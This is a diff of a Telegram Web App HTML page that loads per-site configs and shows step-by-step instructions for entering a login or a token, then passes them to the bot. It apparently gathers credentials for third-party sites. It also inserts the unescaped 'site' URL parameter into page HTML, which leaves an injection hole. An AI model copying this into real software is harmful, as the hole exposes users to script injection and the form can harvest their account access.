@@ -12,6 +12,7 @@
             --background-color: #f9f9f9;
             --text-color: #333;
         }
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--background-color);
@@ -19,6 +20,7 @@
             margin: 0;
             line-height: 1.6;
         }
+
         .container {
             max-width: 800px;
             margin: 20px auto;
@@ -28,6 +30,7 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             position: relative;
         }
+
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -40,6 +43,7 @@
             align-items: center;
             z-index: 1000;
         }
+
         .modal {
             background: white;
             padding: 25px;
@@ -49,10 +53,12 @@
             position: relative;
             animation: modalShow 0.3s ease;
         }
+
         @keyframes modalShow {
             from { transform: translateY(-20px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
+
         .modal-close {
             position: absolute;
             top: 10px;
@@ -63,26 +69,31 @@
             cursor: pointer;
             color: var(--text-color);
         }
+
         .modal-content {
             display: flex;
             align-items: center;
             gap: 15px;
         }
+
         .modal-icon {
             flex-shrink: 0;
         }
+
         h2 {
             color: var(--primary-color);
             text-align: center;
             margin-bottom: 20px;
             font-size: 2em;
         }
+
         .instructions {
             background: #f8f9fa;
             padding: 25px;
             border-radius: 8px;
             margin: 20px 0;
         }
+
         .step {
             margin-bottom: 15px;
             padding: 15px;
@@ -90,11 +101,13 @@
             border-left: 4px solid var(--secondary-color);
             border-radius: 4px;
         }
+
         .platform-tabs {
             display: flex;
             gap: 10px;
             margin: 15px 0;
         }
+
         .platform-tab {
             padding: 10px 20px;
             border-radius: 20px;
@@ -102,10 +115,12 @@
             background: #e0e0e0;
             transition: all 0.3s ease;
         }
+
         .platform-tab.active {
             background: var(--secondary-color);
             color: white;
         }
+
         input {
             width: 100%;
             padding: 12px;
@@ -115,10 +130,12 @@
             font-size: 16px;
             transition: border-color 0.3s ease;
         }
+
         input:focus {
             border-color: var(--secondary-color);
             outline: none;
         }
+
         button.primary {
             background: var(--secondary-color);
             color: white;
@@ -131,9 +148,11 @@
             transition: background 0.3s ease;
             margin-top: 15px;
         }
+
         button.primary:hover {
             background: #2980b9;
         }
+
         .code-block {
             background: #2c3e50;
             color: white;
@@ -142,21 +161,26 @@
             font-family: monospace;
             margin: 10px 0;
         }
+
         .highlight {
             color: var(--secondary-color);
             font-weight: bold;
         }
+
         .hidden {
             display: none;
         }
+
         .input-group {
             margin: 25px 0;
         }
+
         .sub-step {
             margin-left: 30px;
             color: #666;
             position: relative;
         }
+
         .sub-step::before {
             content: '•';
             position: absolute;
@@ -165,7 +189,35 @@
     </style>
     <script async src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        // Функция для генерации HTML-шагов (используется и при формировании инструкций по умолчанию)
+        async function loadConfig(site) {
+            try {
+                const response = await fetch(`configs/${site}.config.json`);
+                if (!response.ok) throw new Error('Конфиг не найден');
+                return await response.json();
+            } catch (error) {
+                showModal(`Ошибка загрузки конфига для сайта: ${site}`);
+                console.error(error);
+                return null;
+            }
+        }
+
+        function showModal(message, type = 'error') {
+            const modalHTML = `
+                <div class="modal-overlay" onclick="closeModal(event)">
+                    <div class="modal">
+                        <button class="modal-close" onclick="closeModal(event)">×</button>
+                        <div class="modal-content">
+                            <svg class="modal-icon" width="32" height="32" viewBox="0 0 24 24" fill="${type === 'error' ? '#e74c3c' : '#3498db'}">
+                                <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z"/>
+                            </svg>
+                            <div>${message}</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', modalHTML);
+        }
+
         function generateSteps(steps, stepNumber = 1) {
             return steps.map((step, index) => {
                 const currentStep = stepNumber + index;
@@ -184,46 +236,68 @@
             }).join('');
         }
 
-        // Получение GET-параметров из URL
         function getQueryParam(name) {
             return new URLSearchParams(window.location.search).get(name);
         }
 
-        // Отображение подсказок для платформ (ПК/Мобильные)
-        function showPlatform(platform) {
+        function showPlatform(platformKey) {
             document.querySelectorAll('.platform-tab').forEach(tab => 
-                tab.classList.toggle('active', tab.textContent.toLowerCase().includes(platform))
+                tab.classList.toggle('active', tab.dataset.platform === platformKey)
             );
-            document.getElementById('pc-instructions').classList.toggle('hidden', platform !== 'pc');
-            document.getElementById('mobile-instructions').classList.toggle('hidden', platform !== 'mobile');
+            document.querySelectorAll('.platform-instructions').forEach(div => {
+                div.classList.toggle('hidden', div.dataset.platform !== platformKey);
+            });
         }
 
-        // Функция показа модального окна с сообщением
-        function showModal(message, type = 'error') {
-            const modalHTML = `
-                <div class="modal-overlay" onclick="closeModal(event)">
-                    <div class="modal">
-                        <button class="modal-close" onclick="closeModal(event)">×</button>
-                        <div class="modal-content">
-                            <svg class="modal-icon" width="32" height="32" viewBox="0 0 24 24" fill="${type === 'error' ? '#e74c3c' : '#3498db'}">
-                                <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z"/>
-                            </svg>
-                            <div>${message}</div>
+        async function initForm() {
+            if (!validateParams()) return;
+
+            const method = getQueryParam("method");
+            const site = getQueryParam("site");
+            const config = await loadConfig(site);
+            
+            if (!config || !config[method]) {
+                showModal('Конфигурация не найдена');
+                return;
+            }
+
+            document.title = site;
+            document.querySelector('h2').textContent = site;
+            document.getElementById(`${method}Form`).style.display = 'block';
+
+            const methodConfig = config[method];
+            const instructionsContainer = document.getElementById('dynamic-instructions');
+            
+            if (methodConfig.platforms) {
+                let tabsHTML = '<div class="platform-tabs">';
+                let contentHTML = '';
+                let firstPlatform = true;
+                
+                for (const [platformKey, platformData] of Object.entries(methodConfig.platforms)) {
+                    tabsHTML += `
+                        <div class="platform-tab ${firstPlatform ? 'active' : ''}" 
+                             data-platform="${platformKey}"
+                             onclick="showPlatform('${platformKey}')">
+                            ${platformData.name}
                         </div>
-                    </div>
-                </div>
-            `;
-            document.body.insertAdjacentHTML('beforeend', modalHTML);
-        }
-
-        // Закрытие модального окна
-        function closeModal(e) {
-            if(e.target.closest('.modal-close') || !e.target.closest('.modal')) {
-                document.querySelector('.modal-overlay')?.remove();
+                    `;
+                    
+                    contentHTML += `
+                        <div class="platform-instructions ${firstPlatform ? '' : 'hidden'}" 
+                             data-platform="${platformKey}">
+                            ${generateSteps(platformData.steps)}
+                        </div>
+                    `;
+                    
+                    firstPlatform = false;
+                }
+                tabsHTML += '</div>';
+                instructionsContainer.innerHTML = tabsHTML + contentHTML;
+            } else {
+                instructionsContainer.innerHTML = generateSteps(methodConfig.steps);
             }
         }
 
-        // Валидация обязательных параметров метода и сайта
         function validateParams() {
             const requiredParams = ['method', 'site'];
             const missingParams = requiredParams.filter(param => !getQueryParam(param));
@@ -246,50 +320,9 @@
             return true;
         }
 
-        // Функция загрузки конфигурационного файла для сайта
-        function loadSiteConfig(site, method) {
-            return fetch('configs/' + site + '.json')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Файл конфигурации не найден');
-                    }
-                    return response.json();
-                })
-                .then(config => {
-                    // Если в конфигурации для данного метода есть инструкция, возвращаем её,
-                    // иначе – инструкцию по умолчанию
-                    if (config[method]) {
-                        return config[method];
-                    }
-                    return generateSteps(['Следуйте стандартной процедуре авторизации']);
-                })
-                .catch(error => {
-                    console.error(error);
-                    return generateSteps(['Следуйте стандартной процедуре авторизации']);
-                });
-        }
-
-        // Инициализация формы авторизации
-        function initForm() {
-            if (!validateParams()) return;
-
-            const method = getQueryParam("method");
-            const site = getQueryParam("site");
-
-            document.title = site;
-            document.querySelector('h2').textContent = site;
-            document.getElementById(`${method}Form`).style.display = 'block';
-
-            loadSiteConfig(site, method).then(instructions => {
-                document.getElementById('dynamic-instructions').innerHTML = instructions;
-                if (method === 'token') showPlatform('pc');
-            });
-        }
-
-        // Отправка данных авторизации
         function submitData() {
             const method = getQueryParam("method");
-            let authData = { method };
+            let authData = { method, site: getQueryParam("site") };
 
             if (method === 'login') {
                 authData.login = document.getElementById('login').value;
@@ -312,7 +345,13 @@
             Telegram.WebApp.close();
         }
 
-        window.onload = initForm;
+        function closeModal(e) {
+            if(e.target.closest('.modal-close') || !e.target.closest('.modal')) {
+                document.querySelector('.modal-overlay')?.remove();
+            }
+        }
+
+        window.onload = () => { initForm().catch(console.error) };
     </script>
 </head>
 <body>
